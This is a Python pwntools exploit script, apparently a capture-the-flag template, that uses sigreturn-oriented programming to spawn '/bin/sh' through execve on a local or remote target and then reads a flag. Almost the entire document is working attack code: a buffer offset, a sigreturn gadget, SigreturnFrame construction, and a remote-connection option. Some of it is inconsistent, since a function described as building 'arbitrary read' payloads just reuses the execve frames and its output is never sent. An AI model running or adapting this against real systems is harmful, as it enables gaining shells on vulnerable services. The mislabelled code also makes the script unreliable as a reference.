#!/usr/bin/env python3
# <!-- audit-ok --> SROP execve via SigreturnFrame
"""SROP execve: sigreturn-oriented programming to execve('/bin/sh').

Uses SigreturnFrame + constants.SYS_rt_sigreturn, yields frame variants.
Requires: context.arch/os set before asm, syscall; ret gadget.
"""
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

exe = context.binary = ELF(args.EXE or "./vuln", checksec=False)
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

HOST = args.HOST or "localhost"
PORT = int(args.PORT or 1337)
GDBSCRIPT = """
b *main
c
"""


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDBSCRIPT)
    return process([exe.path])


OFFSET = 40
SYSCALL_RET = 0x4010a0  # placeholder: syscall; ret in binary or libc
SIGRET = 0x4010b0  # placeholder: mov rax, 0xf; syscall  or sigreturn gadget


def srop_execve_frames(binsh_addr, frame_variants=None):
    """Yield SigreturnFrame variants for execve('/bin/sh', 0, 0)."""
    variants = frame_variants or ["classic", "with_rsp", "alt_regs"]
    for name in variants:
        frame = SigreturnFrame()
        frame.rax = constants.SYS_execve
        frame.rip = SYSCALL_RET
        frame.rdi = binsh_addr
        frame.rsi = 0
        frame.rdx = 0
        if name == "with_rsp":
            frame.rsp = binsh_addr + 0x100
        elif name == "alt_regs":
            frame.rbx = 0
            frame.rcx = 0
        # SigreturnFrame bytes are placed at OFFSET
        yield name, bytes(frame)


def arb_read_gen(target_addr, size=0x100):
    """Yield arbitrary read payloads building SROP read stage."""
    for name, frame_bytes in srop_execve_frames(target_addr):
        payload = flat({
            OFFSET: [
                SIGRET,  # trigger sigreturn via sigret gadget
                frame_bytes,
            ]
        })
        yield (name, payload)


def build_srop_chain(binsh_addr):
    """Build final SROP chain: sigreturn -> execve."""
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = binsh_addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = SYSCALL_RET
    frame.rsp = binsh_addr
    return flat({
        OFFSET: [
            SIGRET,
            bytes(frame),
        ]
    })


def exploit():
    io = start()
    binsh = 0x404000  # writable .bss placeholder
    # stage: write "/bin/sh" then SROP
    io.send(b"/bin/sh\x00")
    for name, payload in arb_read_gen(binsh):
        log.info(f"SROP variant: {name} len={len(payload)}")
    final = build_srop_chain(binsh)
    io.sendline(final)
    io.sendline(b"cat flag*")
    io.interactive()


if __name__ == "__main__":
    exploit()
